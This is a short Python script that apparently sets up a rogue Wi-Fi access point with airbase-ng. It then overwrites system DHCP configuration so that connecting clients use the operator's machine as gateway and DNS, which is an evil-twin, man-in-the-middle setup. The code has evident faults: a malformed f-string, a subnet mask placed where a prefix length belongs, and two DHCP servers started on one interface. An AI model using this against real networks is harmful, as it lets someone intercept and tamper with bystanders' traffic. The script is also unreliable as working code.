import subprocess
import sys
import time

class RogueAP:
    def __init__(self, interface, essid, channel):
        self.interface = interface
        self.essid = essid
        self.channel = channel

    def create_ap(self):
        subprocess.run(["airbase-ng", "-e", self.essid, "-c", str(self.channel), "-v", self.interface], check=True)

class DHCPServer:
    def __init__(self, interface, ip_address, subnet_mask, start_ip, end_ip):
        self.interface = interface
        self.ip_address = ip_address
        self.subnet_mask = subnet_mask
        self.start_ip = start_ip
        self.end_ip = end_ip

    def setup(self):
        subprocess.run(["systemctl", "stop", "dnsmasq"], check=True)
        subprocess.run(["systemctl", "stop", "isc-dhcp-server"], check=True)
        subprocess.run(["systemctl", "stop", "kea-dhcp4-server"], check=True)

        kea_config = f"""
{
    "Dhcp4": {{
        "interfaces-config": {{
            "interfaces": ["{self.interface}"]
        }},
        "lease-database": {{
            "type": "memfile",
            "lfc-interval": 3600
        }},
        "subnet4": {{
            "subnet": "{self.ip_address}/{self.subnet_mask}",
            "pools": [{{
                "pool": "{self.start_ip} - {self.end_ip}"
            }}],
            "option-data": [
                {{
                    "name": "routers",
                    "data": "{self.ip_address}"
                }},
                {{
                    "name": "domain-name-servers",
                    "data": "{self.ip_address}"
                }}
            ]
        }}
    }}
}}
"""
        with open("/etc/kea/kea-dhcp4.conf", "w") as kea_config_file:
            kea_config_file.write(kea_config)

        dnsmasq_config = f"""
interface={self.interface}
dhcp-range={self.start_ip},{self.end_ip},{self.subnet_mask},12h
dhcp-option=3,{self.ip_address}
dhcp-option=6,{self.ip_address}
"""
        with open("/etc/dnsmasq.conf", "w") as dnsmasq_config_file:
            dnsmasq_config_file.write(dnsmasq_config)

        subprocess.run(["systemctl", "start", "kea-dhcp4-server"], check=True)
        subprocess.run(["systemctl", "start", "dnsmasq"], check=True)

        print("DHCP servers successfully set up.")
